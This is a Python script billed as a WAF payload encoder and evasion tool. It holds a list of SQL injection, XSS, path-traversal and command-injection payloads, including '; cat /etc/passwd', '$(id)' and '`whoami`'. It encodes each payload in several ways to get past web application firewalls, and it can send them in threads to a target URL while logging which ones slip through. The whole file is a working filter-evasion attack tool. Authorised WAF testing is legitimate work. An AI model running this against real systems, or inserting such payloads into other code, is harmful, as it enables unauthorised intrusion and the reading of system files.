#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF Payload Encoder / Evasion Tool
Part of the WAF Testing Suite
Author: [Your Name]
Legal use only!
"""

import base64
import binascii
import requests
import urllib.parse
import html
import json
import threading
from queue import Queue
import time

# -------------------------
# CONFIGURATION
# -------------------------
PAYLOADS = [
    "' OR '1'='1 --",
    "<script>alert('xss')</script>",
    "../../../../etc/passwd",
    "; cat /etc/passwd",
    "$(id)",
    "`whoami`"
]

# Optional: Load payloads from file
# with open("payloads.txt") as f:
#     PAYLOADS = [line.strip() for line in f if line.strip()]

TARGET_URL = None  # Example: "https://yourtargetdomain.com/test"
THREADS = 5
DELAY_BETWEEN_REQUESTS = 0.3

LOG_FILE = "encoded_payloads.txt"
SEND_LOG_SUCCESS = "encoded_success.txt"
SEND_LOG_BLOCK = "encoded_blocks.txt"

BLOCK_KEYWORDS = ["blocked", "forbidden", "waf", "denied"]

# -------------------------
# ENCODERS
# -------------------------
def encode_payload(payload):
    encodings = {}

    # URL Encoding
    encodings["url_encoded"] = urllib.parse.quote(payload)

    # Double URL Encoding
    encodings["double_url_encoded"] = urllib.parse.quote(urllib.parse.quote(payload))

    # Base64
    encodings["base64"] = base64.b64encode(payload.encode()).decode()

    # Hex Encoding
    encodings["hex"] = binascii.hexlify(payload.encode()).decode()

    # HTML Entity Encoding
    encodings["html_entity"] = html.escape(payload)

    # Unicode Escape
    encodings["unicode_escape"] = payload.encode('unicode_escape').decode()

    return encodings

# -------------------------
# LOGGING
# -------------------------
def log(filename, text):
    with threading.Lock():
        with open(filename, "a", encoding="utf-8") as f:
            f.write(text + "\n")

def detect_waf_block(response_text):
    return any(kw.lower() in response_text.lower() for kw in BLOCK_KEYWORDS)

# -------------------------
# SENDING FUNCTION
# -------------------------
def send_payload(payload):
    try:
        params = {"test": payload}
        r = requests.get(TARGET_URL, params=params, timeout=5)
        if detect_waf_block(r.text):
            log(SEND_LOG_BLOCK, f"[BLOCK] {payload}")
            print(f"[BLOCK] {payload}")
        else:
            log(SEND_LOG_SUCCESS, f"[PASS] {payload} | {r.status_code}")
            print(f"[PASS] {payload} ({r.status_code})")
    except Exception as e:
        print(f"[ERROR] {payload} | {e}")

# -------------------------
# THREAD WORKER
# -------------------------
def worker():
    while not payload_queue.empty():
        try:
            payload = payload_queue.get_nowait()
        except:
            break
        if TARGET_URL:
            send_payload(payload)
            time.sleep(DELAY_BETWEEN_REQUESTS)
        else:
            print(payload)
            log(LOG_FILE, payload)

# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    all_encoded_payloads = []

    # Encode all payloads
    for p in PAYLOADS:
        encs = encode_payload(p)
        for etype, evalue in encs.items():
            formatted = f"{etype}: {evalue}"
            all_encoded_payloads.append(evalue)
            log(LOG_FILE, formatted)

    print(f"[INFO] Generated {len(all_encoded_payloads)} encoded payloads.")

    # If a target is set, send them
    if TARGET_URL:
        payload_queue = Queue()
        for p in all_encoded_payloads:
            payload_queue.put(p)

        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print("[DONE] Payload sending completed.")
    else:
        print(f"[DONE] Encoded payloads saved in {LOG_FILE}")
